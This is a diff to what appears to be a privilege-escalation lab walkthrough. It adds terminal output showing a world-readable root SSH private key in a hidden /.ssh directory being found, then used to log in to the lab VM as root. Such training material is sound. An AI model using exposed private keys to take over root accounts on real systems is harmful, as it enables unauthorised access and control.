@@ -967,6 +967,14 @@ Note that there appears to be a hidden directory called .ssh. View the contents 
 
 `ls -l /.ssh
 
+```
+user@debian:/.ssh$ ls -l /.ssh
+total 4
+-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
+user@debian:/.ssh$ 
+
+```
+
 Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.
 
 Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
@@ -978,3 +986,24 @@ Use the key to login to the Debian VM as the root account:
 `ssh -i root_key root@10.10.168.59
 
 Remember to exit out of the root shell before continuing!
+
+```
+
+┌──(kali㉿kali)-[~]
+└─$ ssh -o HostKeyAlgorithms=+ssh-rsa -i root_key.pem root@10.10.168.59
+sign_and_send_pubkey: no mutual signature supported
+root@10.10.168.59's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
+root@debian:~# 
+
+```
+
+### 
